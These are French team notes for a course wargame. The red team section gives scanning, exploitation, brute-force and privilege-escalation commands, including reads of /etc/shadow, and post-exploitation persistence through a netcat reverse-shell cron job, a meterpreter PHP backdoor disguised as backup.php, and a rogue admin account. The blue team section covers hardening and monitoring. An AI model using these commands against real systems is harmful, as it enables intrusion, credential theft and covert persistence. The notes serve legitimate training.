# Wargame

Notes de préparation pour le wargame par équipe de 6 dans le cadre du cours *Seminars, Challenges, Serious Games and Casus*.

- [Wargame](#wargame)
  - [Red Team](#red-team)
    - [Scanning de base](#scanning-de-base)
    - [Scan de vulnérabilité & exploitation avec metasploit](#scan-de-vulnérabilité--exploitation-avec-metasploit)
    - [Exploitation](#exploitation)
    - [Élévation de privilèges](#élévation-de-privilèges)
    - [Post-exploitation](#post-exploitation)
  - [Blue Team](#blue-team)
    - [Changement des mots de passe & interdictions de base](#changement-des-mots-de-passe--interdictions-de-base)
    - [Énumération des services et connexions](#énumération-des-services-et-connexions)
    - [Monitoring](#monitoring)
    - [Combler les failles](#combler-les-failles)





## Red Team


### Scanning de base

1. scanner le réseau `sudo nmap -sP <network>/<netmask>`
2. chaque personne scanne une machine `sudo nmap -p- -T4 <ip>`
3. scanner le site web `gobuster dir -w /usr/share/wordlists/... -u http://...`
4. chercher les fichiers intéressants comme `robots.txt`, `sitemap.xml`


### Scan de vulnérabilité & exploitation avec metasploit

1. scan de vulnérabilités `sudo nmap --script=vuln -p <port> <ip>`
2. recherche sur internet si on peut les exploiter avec metasploit
3. lancer metasploit `sudo msfconsole`


### Exploitation

1. chercher des failles là où il y a des inputs - on peut trouver plus facilement en fonction de la signature du serveur web (ex: python = template injection) - liste non-exhaustive:
    - template injection
    - command injection
    - code injection
    - injection sql
2. exploiter avec une reverse shell (générateur de reverse shells: https://www.revshells.com/) ou utiliser metasploit (quand c'est possible)
3. essayer de brute force les services qui s'y prêtent bien comme ssh, ftp, etc. dans les noms d'utilisateurs à tester, ajouter *Administrator*, *Student*, *user*, *prof* qui peuvent avoir été créés par les profs, pour les mots de passe ajouter *Tigrou007*, *Tigrou007=*, *user*, *root*, *toor*, etc.
4. si possibilité d'upload: https://github.com/flozz/p0wny-shell


### Élévation de privilèges

1. Obtenir des informations sur l'utilisateur et le système:
    - shell, utilisateur: `whoami`, `id`
    - variables d'environnement: `env`
    - commandes utilisées récemment: `history`
    - si le hostname est bizarre: `hostname`
2. Vérifier les permissions sudo:
    - `sudo -l`
    - `sudo -s`
    - `cat /etc/sudoers`
3. Chercher des credentials dans les fichiers web, bases de données, backups, répertoire personnel:
    - chercher dans les répertoires intéressants:
        - `ls -la $HOME`
        - `ls -la /var/spool/mail`
        - `ls -la /var/www/html`
    - chercher des hashs:
        - `cat /etc/passwd`
        - `cat /etc/shadow`
    - chercher le mdp dans l'historique des commandes:
        - `cat .bash_history | grep sudo`
        - `cat .bash_history | less`
        - `history`
    - chercher des backups/db:
        - `find / -name *.zip  2> /dev/null`
        - `find / -name *.back 2> /dev/null`
        - `find / -name *.db   2> /dev/null`
4. Chercher les fichiers édités récemment:
    - tous: `find / 2>/dev/null | grep -Ev "^/proc"`
    - depuis 10 min: `find / -mmin -10 2>/dev/null | grep -Ev "^/proc"`
5. Trouver les fichiers exécutables:
    - `echo $PATH`
    - `for item in $(echo "iptables perl python ruby gcc wget"); do which $item; done`
6. Trouver les fichiers avec SUID/GUID ou un accès en lecture/écriture étrange:
    - SUID/GUID: `find / -perm -g=s -o -perm -u=s -type f 2>/dev/null`
    - fichier avec permission d'écrire: `find / -writable -type f -o -writable -type d 2>/dev/null | grep -Ev "^(/proc|/home/user|/tmp)"`
    - dossier avec permission d'écrire: `find /\(-perm -o=w -perm -o=x\) -type d 2>/dev/null`
    - dossier avec permission d'exécuter: `find / -perm -o=x -type d 2>/dev/null`
7. Lister les services qui tournent:
    - `ps -ef | grep root`
    - `ps aux`
8. Lister les jobs cron:
    - `crontab -l`
    - `cat /etc/cron.allow`
    - `cat /etc/at.allow`
    - `cat /etc/cron*`
    - `cat /etc/crontab`
    - `cat /etc/anacrontab`
    - `cat /var/spool/cron/crontabs/root`
9. Kexploit/CVE:
    - `searchsploit linux kernel 3.9 –exclude="/dos/"`


### Post-exploitation

- Créer un compte privilégié pour pouvoir se reconnecter au système en cas de problème.
- Persistence avec un cron job shell ` * * * * * nc <ip-kali> <port> -e /bin/sh`
- Persistence avec un cron job shell:
    - faire un payload php avec metasploit
    ```
    msfconsole
    use multi/handler
    set payload php/meterpreter/reverse_tcp
    set LHOST <ip-kali>
    set LPORT <port>
    run
    ```
    - mettre le payload dans le fichier `/var/www/html/backup.php`
    - le rendre persistant avec un cron job: `* * * * * php -f /var/www/html/backup.php`
- Utiliser un rootkit: https://www.linode.com/docs/guides/linux-red-team-defense-evasion-rootkits/
- Mouvement latéral: https://www.linode.com/docs/guides/windows-red-team-lateral-movement-techniques/





## Blue Team


### Changement des mots de passe & interdictions de base

Si c'est autorisé, se connecter à tous les comptes et remplacer le mot de passe par quelque chose de solide.

Faire une GPO dans l'AD pour enlever l'accès à powershell et cmd aux utilisateurs non-admins (les mettre tous dans une OU, puis `gpmc.msc` *user config/admin templates/system/don't run specified windows applications* et ajouter `cmd.exe` et `powershell.exe`). Techniquement, il suffit de renommer l'application pour pouvoir la lancer. Il faut utiliser `gpupdate /force` sur toutes les machines pour le faire appliquer.


### Énumération des services et connexions

Énumération des services:
- Sur linux `systemctl list-units --type=service`
- Sur windows `Get-Service | Where-Object {$_.Status -eq "Running"}` ou `query session`

Énumération des connexions:
- Sur linux `sudo netstat -tulpen` (`sudo apt install net-tools`, on peut ajouter `| grep ESTABLISHED`), tuer le process avec `kill -9 <pid>`
- Sur windows `netstat -anob` (on peut ajouter `| Select-String ESTABLISHED`), si il y a une connexion suspecte (ex: port 4444), tuer le process avec `kill -id <pid>`

Si possible, mettre à jour les services qui écoutent pour une connexion.

### Monitoring

Si on a une GUI et une connexion internet sur windows, télécharger *Process Explorer* de *Sysinternals*: https://download.sysinternals.com/files/TCPView.zip (`curl -Outfile TCPView.zip <url>`)
- si possible, le lancer en administrateur pour pouvoir fermer les process
- ça s'appelle TCPView mais ça monitore aussi les connexions UDP

Si on a une GUI et une connexion internet sur windows, télécharger *Process Explorer* de *Sysinternals*: https://download.sysinternals.com/files/ProcessExplorer.zip (`curl -Outfile ProcessExplorer.zip <url>`)
- si possible, le lancer en administrateur
- ajouter la colonne *VirusTotal* qui scanne les DLL pour voir si elles sont malicieuses (options/VirusTotal.com/Check VirusTotal.com)
- possibilité de tuer un process et tous les sous-process qu'il lance (Attention à supprimer les bons process enfants, pas arrêter le service)
- afficher la ligne de commande ayant lancé les process pour voir les options passées (View/Select Columns.../Command Line)

Sur linux, on peut utiliser `htop` en ligne de commande (`sudo apt install htop`).


### Combler les failles

- Bloquer les connexions anonymes aux serveurs FTP/SSH.
- Cacher les versions des serveurs web (ils les affichent souvent dans un header http).
- Interdire les fonctions dangereuses (ex. en php : `shell_exec`, `eval`, `exec`, etc.).
- Bloquer le suivi des liens symboliques par les serveurs web.
- Empêcher l'indexage des dossiers par les serveurs web.
- Potentiellement chrooter les utilisateurs dans un dossier avec des accès minimums.
- Chercher si il n'y a pas des backups contenant des mots de passe dans le système de fichier, le cas échéant, le supprimer.

